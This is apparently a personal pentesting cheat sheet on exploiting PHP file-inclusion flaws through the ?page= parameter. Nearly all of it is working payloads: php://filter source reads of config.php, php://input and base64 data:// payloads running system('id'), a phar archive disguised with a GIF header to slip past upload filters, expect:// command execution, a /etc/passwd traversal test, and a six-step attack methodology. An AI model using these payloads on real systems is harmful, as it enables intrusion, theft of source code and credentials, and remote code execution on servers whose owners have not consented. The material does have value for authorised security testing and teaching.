# php-page-injection

**Author:** Julien Bongars\
**Date:** 2026-02-12 14:11:10
**Path:**

---

## Description

On some php applications, you will find the `?page=` argument which gives you options. When user input is passed to file functions like `include()`, `require()`, or `file_get_contents()`, PHP stream wrappers can be used to read source code, inject code, or achieve RCE.

## php://filter

Read file source code without executing it. Essential for extracting PHP source through LFI.

```
?page=php://filter/convert.base64-encode/resource=config.php
```

Then base64 decode the output. Without the filter, `include()` would execute the file — with it, you get raw source.

## php://input

Reads raw POST body as a file. Turns LFI into RCE.

```
GET ?page=php://input
POST body: <?php system('id'); ?>
```

Requires `allow_url_include = On`.

## data://

Inline a payload directly in the URL. Turns LFI into RCE without needing file upload or POST.

```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

The base64 decodes to `<?php system('id'); ?>`. Also requires `allow_url_include = On`.

## phar://

Treats a PHAR archive as a filesystem. Useful when you can upload a file but can't get it executed directly.

```
?page=phar://uploads/evil.phar/shell
```

The PHAR can be disguised with a fake file header (e.g. GIF89a) to bypass upload filters.

## expect://

Directly executes OS commands. Rarely enabled (requires `expect` extension).

```
?page=expect://id
```

## Methodology

1. Test for LFI: `?page=../../../etc/passwd`
2. Read source with `php://filter` to understand the app
3. Check `phpinfo()` for `allow_url_include` and `disable_functions`
4. If `allow_url_include = On`: try `php://input` or `data://`
5. If you can upload files: try `phar://`
6. Last resort: `expect://` (usually not available)
